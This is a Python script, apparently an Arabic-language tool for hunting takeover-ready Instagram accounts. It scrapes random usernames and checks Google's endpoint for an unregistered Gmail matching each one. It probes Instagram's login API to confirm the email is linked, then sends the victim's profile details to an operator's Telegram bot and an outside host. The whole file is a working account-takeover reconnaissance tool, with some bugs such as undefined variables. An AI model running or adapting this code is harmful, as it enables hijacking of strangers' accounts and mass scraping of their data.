try:
	import requests,os,names,random,time,mechanize,sys
	from user_agent import generate_user_agent
	from uuid import uuid4
except:
	os.system("pip install requsets")
	os.system("pip install names")
	os.system("pip install user_agent")
	os.system("pip install uid")
	os.system("pip install uuid")
	os.system("clear")
import requests,os,names,json,random
import requests,os,names,random,time
from user_agent import generate_user_agent
from uuid import uuid4
uid = uuid4()
import requests,random,mechanize,time
import requests,random,mechanize,datetime
r = requests.session()
now = datetime.datetime.today()

now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)


hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2022, 12, 6, 20, 00 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("     "+'WESTONn\n @U_OOS\n\n   https://t.me/U_OOS  ')
 print('\n\n')
 print(x)
 
 sys.exit(0)

os.system('clear')
#------------------------------[الالوان]------------------------------
Z =  '\033[1;31m'  #احمر
X =  '\033[1;33m'  #اصفر
Z1 =  '\033[2;31m'  #احمر ثاني
F =  '\033[2;32m'  #اخضر
A =  '\033[2;34m' #ازرق
C =  '\033[2;35m'  #وردي
B =  '\033[2;36m' #سمائي
Y =  '\033[1;34m'  #ازرق فاتح
#------------------------------[h o d e]------------------------------


def azz():
	
	azro = (f"""{C} 
{Z} < اداة صــيد مــتـاحـات 
{F}ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
{Z}  {X} NAME < WESTON
{Z} ---------------------
{Z} {B}  USER < @U_OOS
{Z}----------------------
{Z}  {C} اداة احــد اعــضـاء تـيــم بـحـي
{F}┗━━━━━━━━━━━━━━━━━━━━""")
	for azr in azro.splitlines():
		time.sleep(0.05)
		print(azr)
azz()

sid = input(f'{Z} [{B}⌯{Z}] {F}سـيـزونـك بــحـي{Z} » ' + C)

print(F+'━━━━━━━━━━━━━━━━━━')
token = input(f'{Z} [{B}⌯{Z}] {B}تــوكـنـك  بــحـي{Z} » ' + C)
print(F+'━━━━━━━━━━━━━━━━━━')
ID = input(f'{Z} [{B}⌯{Z}] {Z}ايــديــك بـحـي{Z} » ' + C)
print(F+'━━━━━━━━━━━━━━━━━━')

head={'Cookie':'mid=ZN4VYQABAAFkbQG9Ue8xbEl3uZXk; ig_did=F3FE5EFD-5AC5-47C0-B735-5226E2223F5D; ig_nrcb=1; shbid=13371; shbts=1692643478.1316793; rur=LDC; ig_direct_region_hint=ATN; csrftoken=q7AGRF26RyVyJVlMk1ULcVIwP7LctmoB; ds_user_id=46165248972; sessionid='+sid}
def check(email,user):
 user=str(user)
 email=str(email)
 url='https://i.instagram.com/api/v1/accounts/login/'
 headers = {'User-Agent':'Instagram 136.0.0.34.124 Android (24/7.0; 640dpi; 1440x2560; HUAWEI; LON-L29; HWLON; hi3660; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
 data = {'uuid':uid,  'password':'@whisper666',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
 req= requests.post(url, headers=headers, data=data).json()
 if req['message'] == 'The password you entered is incorrect. Please try again.':
	 rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=head).json()  
	 nam = str(rr['graphql']['user']['full_name'])
	 iddd = str(rr['graphql']['user']['id'])
	 fol = str(rr['graphql']['user']['edge_followed_by']['count'])
	 fols =str(rr['graphql']['user']['edge_follow']['count'])
	 isp = str(rr['graphql']['user']['is_private'])
	 bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
	 re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
	 ree = re.json()
	 dat = ree['date']
	 tlg =(f"""
𖤍 اجــــاك مـــتــــاح  𖤍
════════════════════════➢
𝐍𝐀𝐌𝐄 » {nam}
𝐔𝐒𝐄𝐑𝐍𝐀𝐌 » @{user}
𝐄𝐌𝐀𝐈𝐋 » {email}
𝐅𝐎𝐋𝐋𝐎𝐖𝐒 » {fols}
𝐅𝐎𝐋𝐋𝐎𝐖𝐆 » {fol}
𝐃𝐀𝐓𝐄 » {dat}
𝐏𝐎𝐒𝐓𝐒 » {bio}
𝐋𝐈𝐍𝐊 » https://www.instagram.com/{user}
════════════════════════➢
🛡 𝐁𝐘 » @U_OOS """)
	 print(G+tlg)
	 print(f'{E}====================================')
	 requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
 if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
	 print(f'{Z} ● BaD Instgram «--» {email}')
	 
def yahoo(email,user):
	eml=str(email)
	email=eml.split('@')[0]+'@gmail.com'
	url = 'https://android.clients.google.com/setup/checkavail'
	h = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
	d = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'MAHDI',
		'lastName':'SALAH'
	})
	res = requests.post(url,data=d,headers=h)
	if res.json()['status'] == 'SUCCESS':
	    check(email,user)
	else:
	    print (f'{B} ● Bad gmail «--» '+email)
def users():
 while True:
#  mal=['male','femal']
#  gen=random.choice(mal)
  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
  num='97892'
  rng=int("".join(random.choice(num)for i in range(1)))
  name=str("".join(random.choice(user)for i in range(rng)))
  whisper=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=head).json()
  mn=0
  try:
   while True:
    mn += 1
    user=str(whisper['users'][mn]['user']['username'])
    emai=user
    email=emai+'@gmail.com'
    yahoo(email,user)
  except IndexError:
   users()
users()